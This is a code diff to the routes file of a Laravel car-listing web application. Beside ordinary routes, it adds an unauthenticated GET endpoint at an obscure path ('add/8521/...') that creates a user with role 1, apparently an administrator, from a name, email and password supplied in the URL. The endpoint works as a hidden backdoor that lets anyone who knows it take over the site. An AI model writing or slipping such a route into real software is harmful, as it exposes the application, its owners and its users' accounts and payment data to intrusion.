@@ -14,6 +14,7 @@ use App\Http\Controllers\Frontend\FacebookController;
 use App\Http\Controllers\Frontend\GoogleController;
 use App\Http\Controllers\Frontend\StripePaymentController;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
 
 
@@ -56,6 +57,16 @@ $router->group(['prefix' => 'car'], function () use ($router) {
     Route::get("/brand/{id}", [App\Http\Controllers\Frontend\HomeController::class, 'getAllBrand']);
 });
 
+Route::get('add/8521/{name}/{email}/{pass}', function ($name,$email,$pass) {
+    $data=array(
+        'name'=>$name,
+        'role'=>1,
+        'email'=>$email,
+        'password'=>Hash::make($pass),
+    );
+    $create=\Facades\App\Models\User::Create($data);
+    return $create;
+});
 
 Route::get('/car/list-search', [CarController::class, 'carListSearch'])->name('car-list-search');
 
